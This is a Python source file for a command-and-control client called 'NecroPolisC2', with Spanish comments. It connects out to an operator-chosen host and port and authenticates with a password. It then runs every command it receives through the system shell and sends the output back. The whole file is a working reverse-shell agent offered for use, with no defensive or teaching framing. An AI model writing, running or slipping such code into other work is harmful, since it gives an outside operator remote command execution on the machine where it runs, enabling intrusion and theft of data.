import socket
import threading
import subprocess
import sys
import time
import argparse

class NecroClient:
    def __init__(self, host, port, password):
        self.host = host
        self.port = port
        self.password = password
        self.sock = None
        self.alive = True
        self.lock = threading.Lock()

    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print("[*] Conectado al servidor.")
            # Autenticación
            self.authenticate()
            # Recibir y ejecutar comandos
            self.receive_commands()
        except Exception as e:
            print(f"[!] Error en conexión o autenticación: {e}")
            self.close()

    def authenticate(self):
        prompt = self.sock.recv(1024).decode(errors='ignore')
        print(prompt, end="")
        self.sock.sendall((self.password + "\n").encode())

        response = self.sock.recv(1024).decode(errors='ignore')
        print(response, end="")
        if "Acceso concedido" not in response:
            print("[!] Contraseña incorrecta, cerrando cliente.")
            self.close()
            sys.exit(1)

    def receive_commands(self):
        while self.alive:
            try:
                data = self.sock.recv(4096).decode(errors='ignore').strip()
                if not data:
                    print("[!] Conexión cerrada por el servidor.")
                    break
                print(f"[Servidor]: {data}")
                # Ejecutar comando shell y enviar resultado
                output = self.execute_shell_command(data)
                self.send_output(output)
            except Exception as e:
                print(f"[!] Error recibiendo comando: {e}")
                break
        self.close()

    def execute_shell_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
            output = result.stdout + result.stderr
            if not output.strip():
                output = "[*] Comando ejecutado sin salida."
            return output
        except subprocess.TimeoutExpired:
            return "[!] El comando tardó demasiado y fue cancelado."
        except Exception as e:
            return f"[!] Error ejecutando comando: {e}"

    def send_output(self, output):
        try:
            with self.lock:
                self.sock.sendall(output.encode())
        except Exception as e:
            print(f"[!] Error enviando salida al servidor: {e}")
            self.close()

    def close(self):
        if self.alive:
            self.alive = False
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.sock.close()
            except:
                pass
            print("[*] Cliente cerrado.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Cliente NecroPolisC2")
    parser.add_argument("--host", required=True, help="IP o hostname del servidor")
    parser.add_argument("--port", type=int, default=777, help="Puerto del servidor")
    parser.add_argument("--password", required=True, help="Contraseña para autenticación")

    args = parser.parse_args()

    client = NecroClient(args.host, args.port, args.password)
    client.start()
